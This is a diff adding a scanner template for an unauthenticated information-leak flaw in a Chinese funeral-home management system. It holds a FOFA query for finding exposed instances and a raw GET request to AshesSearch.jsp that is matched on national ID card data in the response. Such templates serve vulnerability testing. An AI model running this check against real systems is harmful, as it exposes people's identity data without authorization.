@@ -1,0 +1,24 @@
+id: funeral-system-ashessearch-info-leak
+
+info:
+  name: "殡仪馆管理系统 AshesSearch.jsp 未授权访问导致敏感信息泄露"
+  author: 0dayPoc
+  severity: medium
+  description: |-
+    fofa: web.icon=="0d1a8dfb0a11c6c31599b83f05e90dfc"||body="defaultCRMB.jsp"||body="defaultCRMLogin.jsp"||body="defaultCRM.jsp"
+      该系统在 AshesSearch.jsp 组件中存在未经授权的敏感数据访问路径，攻击者可通过未认证的HTTP请求直接获取服务器存储的敏感信息。该漏洞源于系统未对 AshesSearch.jsp 的访问权限进行有效校验，导致业务数据暴露风险。
+  tags: 殡仪馆管理系统
+
+http:
+- raw:
+  - |
+    GET /com/byg/ashes/AshesSearch.jsp HTTP/1.1
+    Host: {{Hostname}}
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - '身份证'
